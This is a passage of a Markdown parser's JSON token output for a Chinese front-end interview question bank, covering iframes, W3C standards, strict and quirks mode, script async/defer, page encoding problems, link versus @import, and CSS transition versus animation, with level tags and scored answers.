的资源；\\n","task":false,"loose":false,"text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","tokens":[{"type":"text","raw":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","tokens":[{"type":"text","raw":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","escaped":false}]}]},{"type":"list_item","raw":"+ 灵活性强：可以引入各类网站，即使跨域；","task":false,"loose":false,"text":"灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"灵活性强：可以引入各类网站，即使跨域；","text":"灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"灵活性强：可以引入各类网站，即使跨域；","text":"灵活性强：可以引入各类网站，即使跨域；","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **2：** 缺点：\\n  + 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n  + 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n  + 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","task":false,"loose":false,"text":"**2：** 缺点：\\n+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"**2：** 缺点：\\n","text":"**2：** 缺点：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 缺点：","text":" 缺点：","escaped":false}]},{"type":"list","raw":"+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n","task":false,"loose":false,"text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","tokens":[{"type":"text","raw":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","tokens":[{"type":"text","raw":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","escaped":false}]}]},{"type":"list_item","raw":"+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n","task":false,"loose":false,"text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","tokens":[{"type":"text","raw":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","tokens":[{"type":"text","raw":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","escaped":false}]}]},{"type":"list_item","raw":"+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","task":false,"loose":false,"text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. 谈谈你对 Web 标准以及 W3C 的理解和认识\\n\\n","depth":2,"text":"8. 谈谈你对 Web 标准以及 W3C 的理解和认识","tokens":[{"type":"text","raw":"8. 谈谈你对 Web 标准以及 W3C 的理解和认识","text":"8. 谈谈你对 Web 标准以及 W3C 的理解和认识","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。\\n- **1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。\\n","task":false,"loose":false,"text":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","tokens":[{"type":"text","raw":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","text":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","text":" Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","task":false,"loose":false,"text":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","tokens":[{"type":"text","raw":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","text":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","text":" 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 什么是严格模式与混杂模式？\\n\\n","depth":2,"text":"9. 什么是严格模式与混杂模式？","tokens":[{"type":"text","raw":"9. 什么是严格模式与混杂模式？","text":"9. 什么是严格模式与混杂模式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","task":false,"loose":false,"text":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","tokens":[{"type":"text","raw":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","text":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","text":" 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. script、script async 和 script defer 的区别？\\n\\n","depth":2,"text":"10. script、script async 和 script defer 的区别？","tokens":[{"type":"text","raw":"10. script、script async 和 script defer 的区别？","text":"10. script、script async 和 script defer 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n  \\n  async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n  \\n  defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n  \\n  async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n  \\n  defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","task":false,"loose":true,"text":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n\\nasync - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n\\ndefer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","tokens":[{"type":"text","raw":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","text":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","text":" script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","text":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","tokens":[{"type":"text","raw":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","text":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","text":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","tokens":[{"type":"text","raw":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","text":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. 浏览器乱码的原因是什么？如何解决？\\n\\n","depth":2,"text":"11. 浏览器乱码的原因是什么？如何解决？","tokens":[{"type":"text","raw":"11. 浏览器乱码的原因是什么？如何解决？","text":"11. 浏览器乱码的原因是什么？如何解决？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：原因**\\n    1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n    2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n    3.浏览器不能自动检测网页编码，造成网页乱码。\\n- **1：解决办法**\\n    1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n    2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：原因**\\n    1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n    2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n    3.浏览器不能自动检测网页编码，造成网页乱码。\\n","task":false,"loose":true,"text":"**1：原因**\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n  3.浏览器不能自动检测网页编码，造成网页乱码。","tokens":[{"type":"text","raw":"**1：原因**\\n\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","text":"**1：原因**\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","tokens":[{"type":"strong","raw":"**1：原因**","text":"1：原因","tokens":[{"type":"text","raw":"1：原因","text":"1：原因","escaped":false}]},{"type":"text","raw":"\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","text":"\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","text":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","tokens":[{"type":"text","raw":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","text":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  3.浏览器不能自动检测网页编码，造成网页乱码。","text":"  3.浏览器不能自动检测网页编码，造成网页乱码。","tokens":[{"type":"text","raw":"  3.浏览器不能自动检测网页编码，造成网页乱码。","text":"  3.浏览器不能自动检测网页编码，造成网页乱码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：解决办法**\\n    1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n    2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","task":false,"loose":true,"text":"**1：解决办法**\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","tokens":[{"type":"text","raw":"**1：解决办法**\\n\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","text":"**1：解决办法**\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","tokens":[{"type":"strong","raw":"**1：解决办法**","text":"1：解决办法","tokens":[{"type":"text","raw":"1：解决办法","text":"1：解决办法","escaped":false}]},{"type":"text","raw":"\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","text":"\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","text":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","tokens":[{"type":"text","raw":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","text":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## 12. CSS中 link 和@import 的区别是什么？\\n\\n","depth":2,"text":"12. CSS中 link 和@import 的区别是什么？","tokens":[{"type":"text","raw":"12. CSS中 link 和@import 的区别是什么？","text":"12. CSS中 link 和@import 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\n  import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\n  link方式的样式的权重 高于@import的权重。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\n  import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\n  link方式的样式的权重 高于@import的权重。","task":false,"loose":true,"text":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\nimport只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\nlink方式的样式的权重 高于@import的权重。","tokens":[{"type":"text","raw":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","text":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","text":"   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","text":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","tokens":[{"type":"text","raw":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","text":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"link方式的样式的权重 高于@import的权重。","text":"link方式的样式的权重 高于@import的权重。","tokens":[{"type":"text","raw":"link方式的样式的权重 高于@import的权重。","text":"link方式的样式的权重 高于@import的权重。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. CSS中 transition和animation的区别？\\n\\n","depth":2,"text":"13. CSS中 transition和animation的区别？","tokens":[{"type":"text","raw":"13. CSS中 transition和animation的区别？","text":"13. CSS中 transition和animation的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","task":false,"loose":false,"text":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","tokens":[{"type":"text","raw":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","text":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","text":"  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. 什么是 DOCTYPE， 有何作用？\\n\\n","depth":2,"text":"14. 什么是 DOCTYPE， 有何作用？","tokens":[{"type":"text","raw":"14. 什么是 DOCTYPE， 有何作用？","text":"14. 什么是 DOCTYPE， 有何作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 